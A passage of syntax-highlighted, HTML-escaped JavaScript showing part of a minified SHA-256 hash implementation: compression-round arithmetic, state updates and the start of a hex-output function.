class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">cd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">cd&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">bc&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">bc&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">cd&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hex&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">h0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">hex&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span 